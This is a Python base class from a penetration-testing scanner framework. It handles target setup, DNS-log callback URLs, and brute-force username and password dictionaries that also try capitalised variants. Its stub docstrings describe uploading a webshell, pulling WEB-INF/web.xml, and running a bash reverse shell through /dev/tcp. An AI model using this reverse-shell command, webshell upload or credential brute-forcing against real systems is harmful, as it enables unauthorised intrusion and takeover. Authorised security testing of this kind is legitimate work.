#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

from lib.core.enums import ServicePortMap
from lib.core.env import *
from urllib.parse import urljoin
from urllib.parse import urlparse
from urllib.parse import urlunparse
from lib.core.g import conf
from lib.core.g import log
# from lib.core.enums import ScriptType
from lib.util.aiohttputil import ClientSession
from lib.util.util import random_lowercase_digits
# from lib.api.dnslog import get_dnslog_recode

class BaseScript(object):
    """
    Script 基础类
    """

    def __init__(self):
        # 脚本属性配置
        # self.script_type = ScriptType.NONE

        # 脚本基本配置
        self.service_type = ServicePortMap.UNKNOWN
        self.service = self.service_type[0]
        self.script_absolute_path = sys.modules[self.__module__].__file__
        self.script_path = self.script_absolute_path[len(ROOT_PATH) + 1:]
        self.script_file_name = os.path.basename(self.script_path)
        self.timeout = conf.scan.scan_timeout
        self.name = self.script_path
        self.port_connect = None
        self.log = log

        # 脚本扫描配置
        self.dnslog_top_domain = conf.dnslog.dnslog_top_domain
        self.dnslog = None
        self.result_list = []


    def info(self):
        """获取脚本信息"""
        return {
            "script_name": self.name,
            "script_type": self.script_type,
            "script_file_name": self.script_file_name,
            "script_path": self.script_path,
        }

    def get_dnslog(self):
        keyword = self.script_file_name.replace("/", "").replace("_", "-").rstrip(".py")
        return f"{keyword}.{self.host}.{self.port}.{self.dnslog_top_domain}"

    def get_dnslog_url(self):
        address = self.get_dnslog()
        return f"http://{address}/{random_lowercase_digits(5)}"


    async def generate_username_dict(self):
        """
        生成爆破用户名字典

        :return: username
        """
        dict_username = [x for x in conf.scan.scan_dict.usernames]
        for username in dict_username:
            username = username.replace('\r', '').replace('\n', '').strip().rstrip()
            yield username

    async def generate_password_dict(self):
        """
        生成爆破密码字典

        :return: password
        """

        dict_password = [x for x in conf.scan.scan_dict.passwords]
        for password in dict_password:
            password = password.replace('\r', '').replace('\n', '').strip().rstrip()
            if '%user%' not in password:
                yield password

    async def generate_auth_dict(self, username_list, password_list):
        """
        生成爆破字典

        :return: username, password
        """
        dict_username = list(set(username_list))
        dict_password = list(set(password_list))
        for username in dict_username:
            username = username.replace('\r', '').replace('\n', '').strip().rstrip()
            for password in dict_password:
                if '%user%' not in password:
                    password = password
                else:
                    password = password.replace("%user%", username)
                password = password.replace('\r', '').replace('\n', '').strip().rstrip()
                yield username, password

                # 首位大写也爆破下
                if len(password) > 2:
                    password2 = password[0].upper() + password[1:]
                    if password2 != password:
                        yield username, password2

    async def initialize(self, target, parameter):
        self.target = target
        self.host = target.get("host", None)
        self.port = target.get("port", None)
        self.url = target.get("url", None)
        self.protocol = target.get("protocol", None)
        self.base_url = target.get("base_url", None)
        self.service = target.get("service", None)
        self.port_connect = target.get("port_connect", None)

        if self.port_connect is None and self.name not in ["PingScan", "PortScan"]:

            await self.get_url()

        if self.url and self.name not in ["PingScan"]:
            if self.protocol is None:
                self.protocol = target["protocol"] = self.url[:self.url.index("://")]
            if self.base_url is None:
                self.base_url = target["base_url"] = f"{self.protocol}://{self.host}:{self.port}/"

        self.parameter = parameter

    def get_target(self):
        self.target["url"] = self.url
        self.target["base_url"] = self.base_url
        self.target["protocol"] = self.protocol
        self.target["port_connect"] = self.port_connect
        self.target["service"] = self.service
        return self.target


    def read_file(self, filename, type = 'r'):
        if os.path.isfile(filename):
            with open(filename, type) as f:
                return [line.replace('\r', '').replace('\n', '').strip().rstrip() for line in f.readlines()]
        log.error("File is not exist: %s" %filename)
        return []

    def get_default_dict(self, name):
        try:
            return conf.scan.scan_dict[name]
        except:
            return []

    def load_dict(self):
        """subclass should override this function for prove"""

    async def prove(self):
        """subclass should override this function for prove"""
        raise AttributeError('Function is not exist.')

    async def exec(self):
        """subclass should override this function for prove"""
        raise AttributeError('Function is not exist.')

    async def upload(self):
        """subclass should override this function for upload
            use self.parameter['srcpath'] and self.parameter['despath'] by -p srcpath=webshell.jsp&despath=test.jsp
            demo:
                srcpath = self.parameter['srcpath']
                despath = self.parameter['despath']
                ... upload srcpath to despath...
        """
        raise AttributeError('Function is not exist.')

    async def download(self):
        """subclass should override this function for upload
            use self.parameter['srcpath'] and self.parameter['despath'] by -p srcpath=WEB-INF/web.xml&despath=web.xml
            demo:
                srcpath = self.parameter['srcpath']
                despath = self.parameter['despath']
                ... upload srcpath to despath...
        """
        raise AttributeError('Function is not exist.')

    async def rebound(self):
        """subclass should override this function for upload
            use self.parameter['local_host'] and self.parameter['local_port'] by -p local_host=192.168.1.3&local_port=4444
            demo:
                local_host = self.parameter['local_host']
                local_port = self.parameter['local_port']
                cmd = '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=local_host, port=local_port)
                res = os.system(cmd)
        """
        raise AttributeError('Function is not exist.')


    async def get_url(self):
        async with ClientSession() as session:
            if self.url is None:
                for pro in ['http://', "https://"]:
                    _port = self.port if self.port != None and self.port != 0 else 443 if pro == 'https://' else 80
                    _pro = 'https://' if _port in [443, 8443] else pro
                    url = _pro + self.host + ":" + str(_port) + '/'
                    try:
                        async with session.head(url, allow_redirects=False) as res:
                            if res:
                                self.port_connect = True
                                self.base_url = self.url = url
                                text = await res.text()
                                if res.status == 400 and 'https port' in text:
                                    pass
                                else:
                                    return True
                    except:
                        pass
            else:
                try:
                    async with session.head(self.url, allow_redirects=False) as res:
                        if res:
                            self.port_connect = True
                            return True
                except:
                    pass

        return False


    def get_url_normpath_list(self, base, fix="./"):
        """
        返回拼接后的URL数组

        :param fix: 是否修正
        :param base: 原来路径
        :param url: 拼接各级目录
        :return: list数组
        """

        url_list = []
        if fix is not None:
            fixes = []
            if isinstance(fix, str):
                fixes.append(fix)
            elif isinstance(fix, list):
                fixes = fix
            else:
                fixes = ['']
            for _fix in fixes:
                url = base
                arr = urlparse(url)
                url_list.append(urlunparse((arr.scheme, arr.netloc, arr.path, None, None, None)))
                url_list.append(url)
                url = urljoin(url, './')
                url_list.append(urljoin(url, _fix))
                while True:
                    arr = urlparse(url)
                    if arr.path == '/':
                        break
                    url = urlunparse(arr)
                    url = urljoin(url, '../')
                    url_list.append(urljoin(url, _fix))
        else:
            url_list.append(base)
        return list(set(url_list))


    async def get_dnslog_recode(self, domain=None):
        """请求dnslog recode"""

        if "://" in domain:
            target_arr = urlparse(domain)
            host = target_arr.hostname
            domain = host

        self.dnslog = domain
        return True
        # dnslog_list = await get_dnslog_recode(domain)
        # if len(dnslog_list) > 0:
        #     return True